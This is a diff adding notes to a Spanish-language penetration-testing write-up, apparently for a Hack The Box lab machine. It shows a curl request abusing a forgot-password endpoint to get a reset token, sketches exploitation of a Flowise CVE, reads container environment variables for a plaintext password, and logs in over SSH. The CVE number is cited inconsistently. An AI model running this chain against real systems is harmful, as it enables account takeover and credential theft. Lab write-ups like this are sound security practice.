@@ -481,3 +481,21 @@ En paralelo se continuó la investigación sobre las credenciales expuestas en e
 En este punto se concluye que, aunque se logró la extracción de información sensible crítica (versión del sistema, API key interna y token de reseteo de contraseña), el acceso a funcionalidades de ejecución en MCP aún requiere un mecanismo de autenticación adicional o un contexto privilegiado distinto al obtenido hasta el momento
 
 (CVE-2025-59528  https://github-com.translate.goog/advisories/GHSA-3gcm-f6qx-ff7p?_x_tr_sl=en&_x_tr_tl=es-419&_x_tr_hl=es-419&_x_tr_pto=sc)
+
+nf@nf-To-Be-Filled-By-O-E-M:~/Desktop/wordpress-security-lab/silentium/content$ curl -X POST \
+http://staging.silentium.htb/api/v1/account/forgot-password \
+-H "Content-Type: application/json" \
+-d '{"user":{"email":"ben@silentium.htb"}}'
+
+
+va a devolver el tokentemp luego cambiamos la contrasena y accedemos 
+
+luego en el panel vamos a encontrar una api key por lo cual podemos explotar el cve2025-53528
+accedemos al conetedor docket hacemos un printenv obtenemos la contrasena de ben y entramos atravez de ssh
+HOST REAL (Ubuntu)
+└── Docker daemon
+    └── Contenedor Flowise (Alpine)
+FLOWISE_USERNAME=ben
+FLOWISE_PASSWORD=F1l3_d0ck3r
+
+shh ben@silentium.htb 
